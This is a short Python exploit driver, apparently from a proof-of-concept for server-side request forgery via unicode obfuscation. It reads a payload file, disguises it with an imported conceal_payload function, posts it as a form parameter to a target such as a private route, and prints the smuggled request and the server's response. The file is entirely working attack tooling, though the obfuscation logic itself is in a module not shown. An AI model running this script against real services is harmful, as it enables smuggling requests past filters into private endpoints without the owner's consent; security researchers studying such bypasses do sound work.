from pathlib import Path
import sys

import requests
from unicode_ssrf import conceal_payload


if __name__ == '__main__':
    """
    An example of usage:
    python3 exploit.py localhost:8080/private_route payload
                                                    -------
                                                    path to a file with payload
    """
    target = sys.argv[1]

    payload_text = Path(sys.argv[2]).read_text()
    payload = conceal_payload(payload_text)

    data = {
        "parameter": payload,
    }

    print(f'[*] Sending payload to {target}')
    print(f'[*] Smuggled request: {payload_text}')
    print(f'[*] Payload: {payload}')

    response = requests.post(f'http://{target}', data=data)

    print(f'[*] Response: {response.text}')
